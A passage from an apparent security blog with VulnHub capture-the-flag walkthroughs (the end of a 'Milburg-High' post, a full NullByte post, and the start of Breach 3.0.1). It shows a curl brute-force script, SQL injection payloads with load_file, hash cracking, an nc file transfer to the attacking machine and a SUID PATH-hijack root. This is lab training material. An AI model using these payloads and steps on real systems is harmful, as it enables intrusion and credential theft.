In fact everyone <span class="k">in </span>the IT dept is pretty bad but I can’t blame all of them the newbies Sebastian and James are quite new to managing a server so I can forgive them <span class="k">for </span>that password file they made on the server. But the admin now he’s quite something. Thinks he knows more than everyone <span class="k">else in </span>the dept, he always yells at Sebastian and James now they <span class="k">do </span>some dumb stuff but their new and this is just a high-school server <span class="nb">who </span>cares, the only people that would try and hack into this are script kiddies. His wallpaper policy also is redundant, why <span class="k">do </span>we need custom wallpapers that doesn’t <span class="k">do </span>anything. I have been suggesting <span class="nb">time </span>and <span class="nb">time </span>again to Bob ways we could improve the security since he “cares” about it so much but he just yells at me and says I don’t know what i’m doing. Sebastian has noticed and I gave him some tips on better securing his account, I can’t say the same <span class="k">for </span>his friend James <span class="nb">who </span>doesn’t care and made his password: Qwerty. To be honest James isn’t the worst bob is his stupid web shell has issues and I keep telling him what he needs to patch but he doesn’t care about what I have to say. it’s only a matter of <span class="nb">time </span>before it’s broken into so because of this I have changed my password to

theadminisdumb

I hope bob is fired after the future second breach because of his incompetence. I almost want to fix it myself but at the same <span class="nb">time </span>it doesn’t affect me <span class="k">if </span>they get breached, I get paid, he gets fired it’s a good time.
</code></pre></div></div>

<p>In bob’s home directory, in hidden file, I found the password for users jc and seb.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Milburg-High:/home/bob<span class="nv">$ </span><span class="nb">cat</span> .old_passwordfile.html 

&lt;html&gt;
&lt;p&gt;
jc:Qwerty
seb:T1tanium_Pa<span class="nv">$$</span>word_Hack3rs_Fear_M3
&lt;/p&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>In bob’s Documents directory I found three resources.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Milburg-High:/home/bob/Documents<span class="nv">$ </span><span class="nb">ls
</span>Secret  login.txt.gpg  staff.txt
</code></pre></div></div>

<p>Then I Transfer the login.txt.gpg file to the attacking machine which looks interesting.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Milburg-High:/home/bob/Documents<span class="nv">$ </span>nc <span class="nt">-vlnp</span> 8080 &lt; login.txt.gpg 
listening on <span class="o">[</span>any] 8080 ...
connect to <span class="o">[</span>192.168.179.153] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>192.168.179.1] 59366


root@kali:~<span class="nv">$ </span>nc 192.168.179.153 8080 <span class="o">&gt;</span> login.txt.gpg
</code></pre></div></div>

<p>Inside the secret directory I found a script with notes, as we can see, the first letters vertically say <strong>HARPOCRATES</strong>, this looks like a potential password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@Milburg-High:/home/bob/Documents<span class="nv">$ </span><span class="nb">cat </span>Secret/Keep_Out/Not_Porn/No_Lookie_In_Here/notes.sh 
<span class="c">#!/bin/bash</span>
clear
<span class="nb">echo</span> <span class="s2">"-= Notes =-"</span>
<span class="nb">echo</span> <span class="s2">"Harry Potter is my faviorite"</span>
<span class="nb">echo</span> <span class="s2">"Are you the real me?"</span>
<span class="nb">echo</span> <span class="s2">"Right, I'm ordering pizza this is going nowhere"</span>
<span class="nb">echo</span> <span class="s2">"People just don't get me"</span>
<span class="nb">echo</span> <span class="s2">"Ohhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh &lt;sea santy here&gt;"</span>
<span class="nb">echo</span> <span class="s2">"Cucumber"</span>
<span class="nb">echo</span> <span class="s2">"Rest now your eyes are sleepy"</span>
<span class="nb">echo</span> <span class="s2">"Are you gonna stop reading this yet?"</span>
<span class="nb">echo</span> <span class="s2">"Time to fix the server"</span>
<span class="nb">echo</span> <span class="s2">"Everyone is annoying"</span>
<span class="nb">echo</span> <span class="s2">"Sticky notes gotta buy em"</span>
</code></pre></div></div>

<p>Then I decrypted the login.txt.gpg file with the password: <strong>HARPOCRATES</strong>.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>gpg <span class="nt">--passphrase</span> HARPOCRATES <span class="nt">--decrypt</span> login.txt.gpg
gpg: AES encrypted data
gpg: encrypted with 1 passphrase
bob:b0bcat_
</code></pre></div></div>

<p>Now we have the bob’s password, I switch to the user Bob, this belongs to the sudoers group so he’s allowed to execute any command as root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bob@Milburg-High:~/Documents<span class="nv">$ </span><span class="nb">id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>bob<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>bob<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>bob<span class="o">)</span>,27<span class="o">(</span><span class="nb">sudo</span><span class="o">)</span>
bob@Milburg-High:~/Documents<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
<span class="nb">sudo</span>: unable to resolve host Milburg-High: Connection timed out
<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>bob: 
Matching Defaults entries <span class="k">for </span>bob on Milburg-High:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin

User bob may run the following commands on Milburg-High:
    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
</code></pre></div></div>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="sudo-permissions">Sudo Permissions</h3>

<p>To get root we simply execute the su command as sudo, to read the flag the cat binary isn’t working, so I used the more command.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bob@Milburg-High:~/Documents<span class="nv">$ </span><span class="nb">sudo </span>su -
<span class="nb">sudo</span>: unable to resolve host Milburg-High: Connection timed out
root@Milburg-High:~# <span class="nb">whoami
</span>root
root@Milburg-High:~# <span class="nb">cat</span> /flag.txt 
hey n there /flag.txt
root@Milburg-High:~# more /flag.txt 
CONGRATS ON GAINING ROOT

        .-.
       <span class="o">(</span>   <span class="o">)</span>
        |~|       _.--._
        |~|~:<span class="s1">'--~'</span>      |
        | | :   <span class="c">#root   |</span>
        | | :     _.--._|
        |~|~<span class="sb">`</span><span class="s1">'--~'</span>
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
        | |
   _____|_|_________ Thanks <span class="k">for </span>playing ~c0rruptedb1t
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - NullByte</h1>
	<p class="post-date text-bold text-upcase">
	<span>September 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Boot2root, box will get IP from dhcp, works fine with virtualbox&amp;vmware.</p>

<p><strong>Author:</strong> ly0n</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> Get to /root/proof.txt and follow the instructions.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/nullbyte-1,126/">https://www.vulnhub.com/entry/nullbyte-1,126/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>With arp-scan I discovered the target machine on the local network.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.179.152 00:0c:29:17:a3:71       VMware, Inc.
192.168.179.254 00:50:56:e8:01:3f       VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>I proceeded to perform a full TCP port scan with nmap.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-T4</span> <span class="nt">-p-</span> 192.168.179.152 <span class="nt">-oG</span> nmap/all-tcp-ports.txt
...
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
777/tcp   open  multiling-http
42584/tcp open  unknown
</code></pre></div></div>

<h3 id="service-enumeration">Service Enumeration</h3>

<p>Then I did the version and OS detection, script scanning and traceroute on the target host.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-n</span> <span class="nt">-v</span> <span class="nt">-A</span> <span class="nt">-p80</span>,111,777,42584 192.168.179.152 <span class="nt">-oN</span> nmap/service-enum.txt
...
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 <span class="o">((</span>Debian<span class="o">))</span>
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.10 <span class="o">(</span>Debian<span class="o">)</span>
|_http-title: Null Byte 00 - level 1
111/tcp   open  rpcbind 2-4 <span class="o">(</span>RPC <span class="c">#100000)</span>
| rpcinfo:
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          42584/tcp   status
|   100024  1          46551/tcp6  status
|   100024  1          55369/udp   status
|_  100024  1          59517/udp6  status
777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey:
|   1024 16:30:13:d9:d5:55:36:e8:1b:b7:d9:ba:55:2f:d7:44 <span class="o">(</span>DSA<span class="o">)</span>
|   2048 29:aa:7d:2e:60:8b:a6:a1:c2:bd:7c:c8:bd:3c:f4:f2 <span class="o">(</span>RSA<span class="o">)</span>
|   256 60:06:e3:64:8f:8a:6f:a7:74:5a:8b:3f:e1:24:93:96 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 bc:f7:44:8d:79:6a:19:48:76:a3:e2:44:92:dc:13:a2 <span class="o">(</span>ED25519<span class="o">)</span>
42584/tcp open  status  1 <span class="o">(</span>RPC <span class="c">#100024)</span>
</code></pre></div></div>

<h3 id="web-enumeration">Web Enumeration</h3>

<p>Interacting with the web service I found an image and a text below this.</p>

<p><img src="/assets/images/nullbyte/screenshot-1.png" alt="" /></p>

<p>I downloaded the image and analyzed the exif data, in the comment I found a text that looks like a password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wget http://192.168.179.152/main.gif

root@kali:~<span class="nv">$ </span>exiftool main.gif | <span class="nb">grep</span> <span class="nt">-i</span> <span class="s1">'file name\|comment'</span>
File Name                       : main.gif
Comment                         : P-<span class="o">)</span>: kzMb5nVYJw
</code></pre></div></div>

<p>Then I run wfuzz to find files and directories hidden.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>wfuzz <span class="nt">-c</span> <span class="nt">--hc</span> 404 <span class="nt">-u</span> http://192.168.179.152/FUZZ <span class="nt">-w</span> /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
...
000000164:   301        9 L      28 W       320 Ch      <span class="s2">"uploads"</span>         
000001073:   301        9 L      28 W       323 Ch      <span class="s2">"javascript"</span>     
000010825:   301        9 L      28 W       323 Ch      <span class="s2">"phpmyadmin
</span></code></pre></div></div>

<p>With the directories found I couldn’t do much so I decided use the exif comment and requested it as a web resource, this directed me to a search box.</p>

<p><img src="/assets/images/nullbyte/screenshot-2.png" alt="" /></p>

<p><img src="/assets/images/nullbyte/screenshot-3.png" alt="" /></p>

<p>This search box needs a key, as we can see in the source, the comment explains that the password isn’t complex, so I developed a bash script to perform brute force on it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>

<span class="nv">url</span><span class="o">=</span><span class="s2">"http://192.168.179.152/kzMb5nVYJw/index.php"</span>

<span class="k">for </span>x <span class="k">in</span> <span class="si">$(</span><span class="nb">cat </span>wordlist.txt<span class="si">)</span><span class="p">;</span> <span class="k">do
   </span><span class="nv">ans</span><span class="o">=</span><span class="si">$(</span>curl <span class="nt">-s</span> <span class="nt">-X</span> POST <span class="nv">$url</span> <span class="nt">--data</span> <span class="s2">"key=</span><span class="nv">$x</span><span class="s2">"</span><span class="si">)</span>
   <span class="k">if</span> <span class="o">[[</span> <span class="k">${#</span><span class="nv">ans</span><span class="k">}</span> <span class="nt">-eq</span> 243 <span class="o">]]</span><span class="p">;</span> <span class="k">then
       continue
   else
       </span><span class="nb">echo</span> <span class="s2">"Found: </span><span class="nv">$x</span><span class="s2">"</span>
       <span class="nb">break
   </span><span class="k">fi
done</span>
</code></pre></div></div>

<p>I used the first 50000 passwords from the rockyou, gave it execute permissions and ran the script.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>zcat /usr/share/wordlists/rockyou.txt.gz <span class="o">&gt;</span> rockyou.txt
root@kali:~<span class="nv">$ </span><span class="nb">sed</span> <span class="nt">-n</span> <span class="s1">'1,50000p'</span> rockyou.txt <span class="o">&gt;</span> wordlist.txt
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">chmod</span> +x bfkey.sh
root@kali:~<span class="nv">$ </span>./bfkey.sh  
Found: elite
</code></pre></div></div>

<p>The script found the key <strong>elite</strong>, I entered the key and the site redirected me to another search box, I could verify that it’s interacting with a data base and also is vulnerable to SQL injection.</p>

<p><img src="/assets/images/nullbyte/screenshot-4.png" alt="" /></p>

<p><img src="/assets/images/nullbyte/screenshot-5.png" alt="" /></p>

<p>I used the following payload to list all users.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">" or 1=1 -- -
</span></code></pre></div></div>

<p><img src="/assets/images/nullbyte/screenshot-6.png" alt="" /></p>

<h2 id="exploitation">Exploitation</h2>
<h3 id="sql-injection">SQL Injection</h3>

<p>I decided to use the following SQL statement to detect printable parameters.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">" and 1=2 union select 1,2,3 -- - 
</span></code></pre></div></div>

<p><img src="/assets/images/nullbyte/screenshot-7.png" alt="" /></p>

<p>All fields are printable, I could exploit the SQL injection and retrieve records, but I prefer to read the local files, I listed mysql credentials and access via phpmyadmin.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">" and 1=2 union select load_file('/var/www/html/kzMb5nVYJw/420search.php'),2,3 -- -
</span></code></pre></div></div>

<p><img src="/assets/images/nullbyte/screenshot-8.png" alt="" /></p>

<p><img src="/assets/images/nullbyte/screenshot-9.png" alt="" /></p>

<p>In the table <strong>users</strong> of the database <strong>seth</strong> we see two users but only ramses has password.</p>

<p><img src="/assets/images/nullbyte/screenshot-10.png" alt="" /></p>

<p>The password is encoded in base64, so I decoded it and saved it into a file, then I cracked it with john and got the password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span><span class="nb">echo</span> <span class="nt">-n</span> <span class="s2">"YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE"</span> | <span class="nb">base64</span> <span class="nt">-d</span> 2&gt;/dev/null&gt; mysql_hash.txt

root@kali:~<span class="nv">$ </span>john <span class="nt">--format</span><span class="o">=</span>raw-md5 mysql_hash.txt                                                        
Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 128/128 AVX 4x3]<span class="o">)</span>
Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>2
Proceeding with single, rules:Single
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
Almost <span class="k">done</span>: Processing the remaining buffered candidate passwords, <span class="k">if </span>any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
omega            <span class="o">(</span>?<span class="o">)</span>
</code></pre></div></div>

<h3 id="access-via-ssh">Access via SSH</h3>

<p>I tried to log in via SSH with the user <strong>ramses</strong> and the password <strong>omega</strong> and had access to the system.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>ssh <span class="nt">-l</span> ramses 192.168.179.152 <span class="nt">-p</span> 777
ramses@192.168.179.152<span class="s1">'s password:
ramses@NullByte:~$ id
uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)
</span></code></pre></div></div>

<p>Listing the history I found the path to a file that ramses was running previously.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ramses@NullByte:~<span class="nv">$ </span><span class="nb">cat</span> .bash_history 
<span class="nb">sudo</span> <span class="nt">-s</span>
su eric
<span class="nb">exit
ls
</span>clear
<span class="nb">cd</span> /var/www
<span class="nb">cd </span>backup/
<span class="nb">ls</span>
./procwatch 
clear
<span class="nb">sudo</span> <span class="nt">-s</span>
<span class="nb">cd</span> /
<span class="nb">ls
exit</span>
</code></pre></div></div>

<p>This is a binary SUID with root permissions that runs the <strong>ps</strong> command.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ramses@NullByte:~<span class="nv">$ </span><span class="nb">cd</span> /var/www/backup/
ramses@NullByte:/var/www/backup<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span>
total 20
drwxrwxrwx 2 root root 4096 Aug  2  2015 <span class="nb">.</span>
drwxr-xr-x 4 root root 4096 Aug  2  2015 ..
<span class="nt">-rwsr-xr-x</span> 1 root root 4932 Aug  2  2015 procwatch
<span class="nt">-rw-r--r--</span> 1 root root   28 Aug  2  2015 readme.txt
ramses@NullByte:/var/www/backup<span class="nv">$ </span>file procwatch 
procwatch: setuid ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked, interpreter /lib/ld-linux.so.2, <span class="k">for </span>GNU/Linux 2.6.32, BuildID[sha1]<span class="o">=</span>17d666a0c940726b29feedde855535fb21cb160c, not stripped
ramses@NullByte:/var/www/backup<span class="nv">$ </span>./procwatch 
  PID TTY          TIME CMD
 1729 pts/0    00:00:00 procwatch
 1730 pts/0    00:00:00 sh
 1731 pts/0    00:00:00 ps
</code></pre></div></div>

<p>Then I transfer the binary file to the attacking machine to analyze it.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ramses@NullByte:/var/www/backup<span class="nv">$ </span><span class="nb">cp </span>procwatch ../html/uploads/

root@kali:~<span class="nv">$ </span>wget 192.168.179.152/uploads/procwatch
</code></pre></div></div>

<p>With cutter I analyzed the binary file, this is a reverse engineering tool, you can download it <a href="https://cutter.re/">here</a>, in the following image we can see that the command <strong>ps</strong> (is in little endian) is being executed without the absolute path, so we can hijack the path.</p>

<p><img src="/assets/images/nullbyte/screenshot-11.png" alt="" /></p>

<h2 id="privilege-escalation">Privilege Escalation</h2>
<h3 id="path-hijacking">Path Hijacking</h3>

<p>I created a copy of shell binary as the ps command into the tmp directory, gave it execute permissions, exported the $PATH environment variable and executed it, as we see I got root.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ramses@NullByte:/var/www/backup<span class="nv">$ </span><span class="nb">cat</span> /bin/sh <span class="o">&gt;</span> /tmp/ps
ramses@NullByte:/var/www/backup<span class="nv">$ </span><span class="nb">chmod </span>755 /tmp/ps 
ramses@NullByte:/var/www/backup<span class="nv">$ </span><span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span>/tmp:<span class="nv">$PATH</span>
ramses@NullByte:/var/www/backup<span class="nv">$ </span><span class="nb">echo</span> <span class="nv">$PATH</span>
/tmp:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
ramses@NullByte:/var/www/backup<span class="nv">$ </span>./procwatch 
<span class="c"># id</span>
<span class="nv">uid</span><span class="o">=</span>1002<span class="o">(</span>ramses<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1002<span class="o">(</span>ramses<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1002<span class="o">(</span>ramses<span class="o">)</span>
<span class="c"># whoami</span>
root
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># cd /root</span>
<span class="c"># cat proof.txt</span>
adf11c7a9e6523e630aaf3b9b7acb51d

It seems that you have pwned the box, congrats. 
Now you <span class="k">done </span>that I wanna talk with you. Write a walk &amp; mail at
xly0n@sigaint.org attach the walk and proof.txt
If sigaint.org is down you may mail at nbsly0n@gmail.com


USE THIS PGP PUBLIC KEY

<span class="nt">-----BEGIN</span> PGP PUBLIC KEY BLOCK-----
Version: BCPG C# v1.6.1.0

mQENBFW9BX8BCACVNFJtV4KeFa/TgJZgNefJQ+fD1+LNEGnv5rw3uSV+jWigpxrJ
Q3tO375S1KRrYxhHjEh0HKwTBCIopIcRFFRy1Qg9uW7cxYnTlDTp9QERuQ7hQOFT
e4QU3gZPd/VibPhzbJC/pdbDpuxqU8iKxqQr0VmTX6wIGwN8GlrnKr1/xhSRTprq
Cu7OyNC8+HKu/NpJ7j8mxDTLrvoD+hD21usssThXgZJ5a31iMWj4i0WUEKFN22KK
+z9pmlOJ5Xfhc2xx+WHtST53Ewk8D+Hjn+mh4s9/pjppdpMFUhr1poXPsI2HTWNe
YcvzcQHwzXj6hvtcXlJj+yzM2iEuRdIJ1r41ABEBAAG0EW5ic2x5MG5AZ21haWwu
Y29tiQEcBBABAgAGBQJVvQV/AAoJENDZ4VE7RHERJVkH/RUeh6qn116Lf5mAScNS
HhWTUulxIllPmnOPxB9/yk0j6fvWE9dDtcS9eFgKCthUQts7OFPhc3ilbYA2Fz7q
m7iAe97aW8pz3AeD6f6MX53Un70B3Z8yJFQbdusbQa1+MI2CCJL44Q/J5654vIGn
XQk6Oc7xWEgxLH+IjNQgh6V+MTce8fOp2SEVPcMZZuz2+XI9nrCV1dfAcwJJyF58
kjxYRRryD57olIyb9GsQgZkvPjHCg5JMdzQqOBoJZFPw/nNCEwQexWrgW7bqL/N8
TM2C0X57+ok7eqj8gUEuX/6FxBtYPpqUIaRT9kdeJPYHsiLJlZcXM0HZrPVvt1HU
<span class="nv">Gms</span><span class="o">=</span>
<span class="o">=</span>PiAQ
<span class="nt">-----END</span> PGP PUBLIC KEY BLOCK-----
</code></pre></div></div>

  
    <h1 class="post-title">VulnHub - Breach 3.0.1</h1>
	<p class="post-date text-bold text-upcase">
	<span>September 2021</span>
	</p>

	<p class="post-date text-bold text-upcase">
  
</p>

<div class="soopr-btn"
   data-twitter="SooprCo"
>
</div>

    <p><strong>Description:</strong> Is a slightly longer boot2root/CTF challenge which attempts to showcase a few real-world scenarios/vulnerabilities, with plenty of twists and trolls along the way.</p>

<p><strong>Author:</strong> mrb3n</p>

<p><strong>Operating System:</strong> Linux</p>

<p><strong>Aim:</strong> To get root shell and read the flag.</p>

<p><strong>Download:</strong> <a href="https://www.vulnhub.com/entry/breach-301,177/">https://www.vulnhub.com/entry/breach-301,177/</a></p>

<h2 id="information-gathering">Information Gathering</h2>
<h3 id="host-discovery">Host Discovery</h3>

<p>With arp-scan I discovered the target on the local network.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>arp-scan <span class="nt">-I</span> vmnet1 192.168.179.1/24
Interface: vmnet1, <span class="nb">type</span>: EN10MB, MAC: 00:50:56:c0:00:01, IPv4: 192.168.179.1
WARNING: host part of 192.168.179.1/24 is non-zero
Starting arp-scan 1.9.7 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
192.168.179.150 00:0c:29:07:a3:39       VMware, Inc.
192.168.179.254 00:50:56:e8:14:c5       VMware, Inc.
</code></pre></div></div>

<h3 id="port-scanning">Port Scanning</h3>

<p>I proceed to do a full TCP and UDP port scan with unicornscan, but only could discover the port 161 SNMP.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>us <span class="nt">-mT</span> <span class="nt">-Iv</span> 192.168.179.150:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3 <span class="o">&amp;&amp;</span> us <span class="nt">-mU</span> <span class="nt">-Iv</span> 192.168.179.150:a <span class="nt">-r</span> 3000 <span class="nt">-R</span> 3
adding 192.168.179.150/32 mode <span class="sb">`</span>TCPscan<span class="s1">' ports `a'</span> pps 3000
using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
sender statistics 2112.7 pps with 196608 packets sent total
listener statistics 0 packets recieved 0 packets droped and 0 interface drops
adding 192.168.179.150/32 mode <span class="sb">`</span>UDPscan<span class="s1">' ports `a'</span> pps 3000
using interface<span class="o">(</span>s<span class="o">)</span> vmnet1
scaning 1.00e+00 total hosts with 1.97e+05 total packets, should take a little longer than 1 Minutes, 12 Seconds
UDP open 192.168.179.150:161  ttl 64
sender statistics 2266.6 pps with 196635 packets sent total
listener statistics 6 packets recieved 0 packets droped and 0 interface drops
UDP open                    snmp[  161]         from 192.168.179.150  ttl 64
</code></pre></div></div>

<h3 id="snmp-enumeration">SNMP Enumeration</h3>

<p>I ran all SNMP related nmap scripts, as we can see the public community string is available.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>nmap <span class="nt">-sU</span> <span class="nt">-Pn</span> <span class="nt">-sV</span> <span class="nt">--script</span> snmp-<span class="k">*</span> <span class="nt">-p161</span> 192.168.179.150
...
PORT    STATE SERVICE VERSION
161/udp open  snmp    SNMPv1 server<span class="p">;</span> net-snmp SNMPv3 server <span class="o">(</span>public<span class="o">)</span>
| snmp-brute: 
|_  public - Valid credentials
| snmp-info: 
|   enterprise: net-snmp
|   engineIDFormat: unknown
|   engineIDData: ad610f2abb4d5b5800000000
|   snmpEngineBoots: 34
|_  snmpEngineTime: 21m22s
| snmp-sysdescr: Linux Initech-DMZ01 4.4.0-45-generic <span class="c">#66~14.04.1-Ubuntu SMP Wed Oct 19 15:05:38 UTC 2016 x86_64</span>
|_  System <span class="nb">uptime</span>: 21m23.29s <span class="o">(</span>128329 timeticks<span class="o">)</span>
</code></pre></div></div>

<p>Then enumerated SNMPv1 with the public community string, was possible to detect the the system information, an email and a telephone number, after a lot of time and with no idea to compromise the machine, occurred me to use the telephone number to perform port knocking.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~<span class="nv">$ </span>snmpwalk <span class="nt">-c</span> public <span class="nt">-v</span> 1 192.168.179.150
iso.3.6.1.2.1.1.1.0 <span class="o">=</span> STRING: <span class="s2">"Linux Initech-DMZ01 4.4.0-45-generic #66~14.04.1-Ubuntu SMP Wed Oct 19 15:05:38 UTC 2016 x86_64"</span>
iso.3.6.1.2.1.1.2.0 <span class="o">=</span> OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 <span class="o">=</span> Timeticks: <span class="o">(</span>280080<span class="o">)</span> 0:46:40.80
iso.3.6.1.2.1.1.4.0 <span class="o">=</span> STRING: <span class="s2">"Email: Milton@breach.local - (545)-232-1876"</span>
iso.3.6.1.2.1.1.5.0 <span class="o">=</span> STRING: <span class="s2">"Initech-DMZ01"</span>
iso.3.6.1.2.1.1.6.0 <span class="o">=</span> STRING: <span class="s2">"Initech - is this thing on? I doubt anyone thinks to look here, anyways, I've left myself a way back in and burn the place down once again."</span>
iso.3.6.1.2.1.1.8.0 <span class="o">=</span> Timeticks: <span class="o">(</span>35<span class="o">)</span> 0:00:00.35
iso.3.6.1.2.1.1.9.1.2.1 <span class="o">=</span> OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 <span class="o">=</span> OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.3 <span class="o">=</span> OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.4 <span class="o">=</span> OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 <span class="o">=</span> OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.6 <span class="o">=</span> OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.7 <span class="o">=</span> OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 <span class="o">=</span> OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.9 <span class="o">=</span> OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 <span class="o">=</span> OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 <span class="o">=</span> STRING: <span class="s2">"The MIB for Message Processing and Dispatching."</span>
iso.3.6.1.2.1.1.9.1.3.2 <span class="o">=</span> STRING: <span class="s2">"The management information definitions for the SNMP User-based Security Model."</span>
